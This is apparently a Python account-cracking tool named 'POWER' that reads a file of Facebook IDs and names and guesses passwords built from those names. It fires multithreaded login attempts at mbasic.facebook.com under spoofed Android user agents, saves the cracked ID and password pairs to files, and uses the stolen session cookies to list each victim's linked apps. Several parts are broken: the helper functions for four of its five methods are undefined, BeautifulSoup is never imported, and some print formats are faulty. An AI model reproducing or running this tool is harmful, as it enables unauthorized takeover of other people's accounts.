#from os import path
#import os,base64,zlib,pip,urllib,cython
#print('\n\033[1;32m[=]\033[1;37m\033[1;32m FREE TOOL ENJOY... ')
#os.system(' pip uninstall requests-y  ; pip install requests') 

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,json,time,re,random,sys,uuid,string,subprocess,zlib,platform,base64   
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python POWER.py')        
except:pass
#----------------------mdls--------------------------#        
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GTGT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919SGT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=("SM-G920F","NRD90M", "SM-T535","LRX22G", "SM-T231","KOT49H", "SM-J320F","LMY47V", "GT-I9190","KOT49H", "GT-N7100","KOT49H", "SM-T561","KTU84P", "GT-N7100","KOT49H", "GT-I9500","LRX22C", "SM-J320F","LMY47V", "SM-G930F","NRD90M", "SM-J320F","LMY47V", "SM-J510FN","NMF26X", "GT-P5100","IML74K", "SM-J320F","LMY47V", "GT-N8000","JZO54K", "SM-T531","LRX22G", "SPH-L720","KOT49H", "GT-I9500","JDQ39", "SM-G935F","NRD90M", "SM-T561","KTU84P", "SM-T531","KOT49H", "SM-J320FN","LMY47V", "SM-A500F","MMB29M", "SM-A500FU","MMB29M", "SM-A500F","MMB29M", "SM-T311","KOT49H", "SM-T531","LRX22G", "SM-J320F","LMY47V", "SM-J320FN","LMY47V", "SM-J320F","LMY47V", "GT-P5210","KOT49H", "SM-T230","KOT49H", "GT-I9192","KOT49H", "SM-T235","KOT4", "GT-N7100","KOT49H", "SM-A500F","LRX22G", "SM-A500F","MMB29M", "GT-N7100","KOT49H", "SM-G920F","MMB29K", "SM-J510FN","NMF26X", "GT-N8000","JZO54K", "SM-J320FN","LMY47V", "SM-J320FN","LMY47V", "SM-A500H","MMB29M", "GT-I9300","JSS15J", "GT-I9500","LRX22C", "SM-J320F","LMY4", "SM-J510FN","NMF26X", "SM-A500F","MMB29M", "GT-N8000","KOT49H", "SM-T561","KTU84P", "SM-G900F","KOT49H", "GT-S7390","JZO54K", "SM-J320F","LMY47V", "GT-P5100","JZO54K", "SM-A500FU","MMB29M", "SM-G930F","NRD90M", "SM-J510FN","NMF26X", "SM-T561","KTU84P", "GT-N8000","KOT49H", "SM-T531","LRX22G", "SM-J510FN","MMB29M", "SM-J510FN","NMF26X", "SM-J320F","LMY47V", "GT-P5110","JDQ39", "GT-I9301I","KOT49H", "SM-A500F","LRX22G", "SM-G930F","NRD90M", "SM-T311","KOT4", "GT-P5200","KOT49H", "GT-I9301I","KOT49H", "SM-J320M","LMY47V", "SM-T531","LRX22G", "SM-T820","NRD90M", "GT-I9192","KOT49H", "SM-G935F","MMB29K", "SM-J701F","NRD90M;", "GT-I9301I","KOT4", "SM-J320FN","LMY47V", "SM-T111","JDQ39", "SM-A500F","MMB29M", "SM-J510FN","NMF2", "SM-T705","LRX22G", "SM-G920F","NRD90M", "GT-N5100","JZO54K", "GT-I9300I","KTU84P", "GT-I9300I","KTU84P", "GT-N8000","KOT49H", "GT-N8000","KOT49H", "SM-A500F","MMB29M", "GT-I9190","KOT49H", "SM-J510FN","NMF26X", "SM-J320F","LMY47V", "GT-P5100","GT-I9190","KOT49H","GT-I9192","KOT49H","GT-I9300I","KTU84P","GT-I9300","IMM76D","GT-I9300","JSS15J","GT-I9301I","KOT4","GT-I9301I","KOT49H","GT-I9500","JDQ39","GT-I9500","LRX22C","GT-N5100","JZO54K","GT-N7100","KOT49H","GT-N8000","JZO54K","GT-N8000","KOT49H","GT-P3110","JZO54K","GT-P5100","IML74K","GT-P5100","JDQ","GT-P5100","JDQ39","GT-P5100","JZO54K","GT-P5110","JDQ39","GT-P5200","KOT49H","GT-P5210","KOT49H","GT-P5220","JDQ39","GT-S7390","JZO54K","SAMSUNG","SM-A500F","SAMSUNG","SM-G532F","SAMSUNG","SM-G920F","SAMSUNG","SM-G935F","SAMSUNG","SM-J320F","SAMSUNG","SM-J510FN","SAMSUNG","SM-N920S","SAMSUNG","SM-T280","SM-A500FU","MMB29M","SM-A500F","LRX22G","SM-A500F","MMB29M","SM-A500H","MMB29M","SM-G900F","KOT49H","SM-G920F","MMB29K","SM-G920F","NRD90M","SM-G930F","NRD90M","SM-G935F","MMB29K","SM-G935F","NRD90M","SM-G950F","NRD90M","SM-J320FN","LMY47V","SM-J320F","LMY4","SM-J320F","LMY47V","SM-J320H","LMY47V","SM-J320M","LMY47V","SM-J510FN","MMB29M","SM-J510FN","NMF2","SM-J510FN","NMF26X","SM-J510FN","NMF26X;","SM-J701F","NRD90M;","SM-T111","JDQ39","SM-T230","KOT49H","SM-T231","KOT49H","SM-T235","KOT4""SM-T310","KOT49H","SM-T311","KOT4","SM-T311","KOT49H","SM-T315","JDQ39","SM-T525","KOT49H","SM-T531","KOT49H","SM-T531","LRX22G","SM-T535","LRX22G","SM-T555","LRX22G","SM-T561","KTU84P","SM-T705","LRX22G","SM-T705","LRX22G","SM-T805","LRX22G","SM*T820","NRD90M","SPH-L720","KOT49H","GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
xxxxx=requests.get('https://raw.githubusercontent.com/MOHAMEED-143/ONLY-GREEN/5ff57fa6eb95d959416adaf76fc1b5531ba8839f/mdls.txt').text.splitlines()
#----------------------ugen--------------------------#

ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(xxxxx)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
#----------------------ugen-2-------------------------#        
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 12;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; SM-A235F Build/SP1A.210812.016; wv)'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#----------------------version--------------------------#
try:
    version = requests.get('https://raw.githubusercontent.com/Enknow-404/POWER-HD/main/version').text
except:
    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m Your Have No Internet Connection -v ..!');exit()
version = version.strip()#--------------------------logo-----------------------------------#
sys.stdout.write('\x1b]2;[=]-POWER-[=]\x07')
#--------------------------------------------------------------------#
logo=("""\033[1;32m
PPPPPP   OOOOO  WW      WW EEEEEEE RRRRRR 
PP   PP OO   OO WW      WW EE      RR   RR 
PPPPPP  OO   OO WW   W  WW EEEEE   RRRRRR   
PP      OO   OO  WW WWW WW EE      RR  RR   
PP       OOOO0    WW   WW  EEEEEEE RR   RR 
\033[1;37m================\033[1;37m===========\033[1;37m================
            \033[1;31m| \033[1;32mVERISION\033[1;31m : \033[1;32m1.0.4\033[1;31m| \033[1;32m
\033[1;37m================\033[1;37m===========\033[1;37m================
 \033[1;32m[=]\033[1;37m DEVLOPER \033[1;31m: \033[1;32mENKNOW ! 
 \033[1;32m[=]\033[1;37m FACEBOOK \033[1;31m: \033[1;32mENKNOW !
 \033[1;32m[=]\033[1;37m STATE \033[1;31m   : \033[1;32mFREE
 \033[1;32m[=]\033[1;37m TIPE\033[1;31m     : \033[1;32mFILE CLONE
\033[1;37m================\033[1;37m===========\033[1;37m================""")
#--------------------------------------linex--------------------------#
def linex():
        print('\033[1;37m================\033[1;37m===========\033[1;37m================')
#--------------------------------------clear --------------------------#
def clear():
        os.system('clear')
        print(logo)
#----------------------------cek_apk---------------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\033[1;32m [=]\033[1;37m Active Apks & Web Not Found %s        '%(N,H,N,H,N))
    else:
        print(f'\r\033[1;32m [=]\033[1;32m Active Apks & Web 👇 '%(H))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\033[1;32m [=]\033[1;37m Expired Apks & Web Not Found %s        '%(N,M,N,M,N))
    else:
        print(f'\r\033[1;32m [=]\033[1;31m Expired Apks & Web 👇 '%(M))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
#-------------------------------[]---------------------------------#        
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#------------------------------MENU--------------------------#

def menu():
        try:
                clear()
        
                x = ("sex")
                if x == ("sex"):
                        print(' \033[1;32m[1] \033[1;37mFile cloning\n \033[1;32m[2] \033[1;37mCrate File\n \033[1;32m[3] \033[1;37mUnblock Ip \n \033[1;32m[4] \033[1;37mCheak Apk \n \033[1;32m[5] \033[1;37mAdmin Contact \n \033[1;32m[0] \033[1;37mExit ')
                        linex()
                        xd=input('\033[1;32m [=] \033[1;37mCHOSE \033[1;31m:\033[1;32m  ')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;32m [=]\033[1;37m Put file example \033[1;31m:\033[1;32m /sdcard/File.txt ')
                                linex()
                                file = input('\033[1;32m [=]\033[1;37m Put file path\033[1;31m :\033[1;32m ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('\033[1;32m [=]\033[1;37m File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()                                
                                print('\033[1;32m [1]\033[1;37m Method \033[1;31m[\033[1;32mNEW\033[1;31m]  \n\033[1;32m [2]\033[1;37m Method \033[1;31m[\033[1;32mOLD\033[1;31m] \n\033[1;32m [3]\033[1;37m Method \033[1;31m[\033[1;32mOLD\033[1;31m] \n\033[1;32m [4]\033[1;37m Method \033[1;31m[\033[1;32mMIX\033[1;31m] \n\033[1;32m [5]\033[1;37m Method \033[1;31m[\033[1;32mMIX\033[1;31m]  ')
                                linex()
                                mthd=input('\033[1;32m [=]\033[1;37m CHOICE\033[1;31m :\033[1;37m ')
                                clear()                  
                                plist = []
                                print(f'\033[1;32m [=]\033[1;37m Password System');linex();print(f'\033[1;32m [1]\033[1;37m Auto Password Clone \n\033[1;32m [2]\033[1;37m Choice Password Clone ');linex()
                                ppp=input(f'\033[1;32m [=]\033[1;37m CHOICE \033[1;31m:\033[1;37m ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first first')
                                        plist.append('firstfirst')
                                        plist.append('last first')
                                        plist.append('lastfirst')
                                        plist.append('lastlast')
                                        plist.append('last last')
                                        plist.append('firstlast123')
                                        plist.append('firstlast123456')
                                        plist.append('firstlast123789')
                                        plist.append('first12')
                                        plist.append('first123')
                                        plist.append('first123456')
                                        plist.append('first123456789')
                                        plist.append('first 12')
                                        plist.append('first 123')
                                        plist.append('first 123456')
                                        plist.append('first 123456789')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\033[1;32m [=]\033[1;37m PASSWORD LIMIT \033[1;31m: \033[1;32m'))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\033[1;32m [=]\033[1;37m EXAMPLE \033[1;31m:\033[1;32m Firstlast \033[1;31m| \033[1;32mFirst 123\033[1;31m |\033[1;32m First123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;32m [=]\033[1;37m PASSWORD NO {i+1} \033[1;31m:\033[1;32m '))               
                                clear() 
                                print('\033[1;32m [=]\033[1;37m DO YOU WHANT SHOW CP [\033[1;32mY\033[1;37m/\033[1;31mN\033[1;37m] \033[1;31m:\033[1;32m ')
                                linex()
                                cx=input('\033[1;32m [=]\033[1;37m CHOOSE \033[1;31m:\033[1;32m ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;32m [=]\033[1;37m TOTAL FILE IDS \033[1;31m: \033[1;32m'+total_ids+f' ')                                        
                                        print('\033[1;32m [=]\033[1;37m METHOD CHOICE \033[1;31m: \033[1;32mM'+mthd+f' ')
                                        print("\033[1;32m [=]\033[1;37m IF NO RUSLT [\033[1;32mON\033[1;37m/\033[1;31mOFF\033[1;37m] \033[1;37mMODE AVION ")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist   
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)                                                                                                  
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)                                                                                                  
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api4,ids,names,passlist)                                                                                                  
                                                elif mthd in ['5','05']:
                                                        crack_submit.submit(api5,ids,names,passlist)                                                                                                  
                                                
                                print('\033[1;37m')
                                linex()
                                print('\033[1;32m[=]\033[1;37m The process has completed')
                                print('\033[1;32m[=]\033[1;37m Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python POWER.py')
                        elif xd in ['2','02']:
                                os.system('python crate.py')                     
                        elif xd in ['3','03']:
                                os.system('python ip.py')                     
                        elif xd in ['4','04']:                       
                        	    import chek
                        elif xd in ['5','05']:
                        	    os.system('xdg-open https://t.me/uex_v')
                        elif xd in ['0','00']:
                        	    exit() 
                        
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
#--------------- METHOD-1----------#
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-HD\033[1;37m]  %s  \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        pro=random.choice(ugen)
                        head = {'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': pro, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aking=session.cookies.get_dict().keys()
                        if "c_user" in Aking:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [POWER-OK] %s | %s'%(ids,pas))
                                cek_apk(session,coki)
                                open('/sdcard/POWER-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m [POWER-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/POWER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
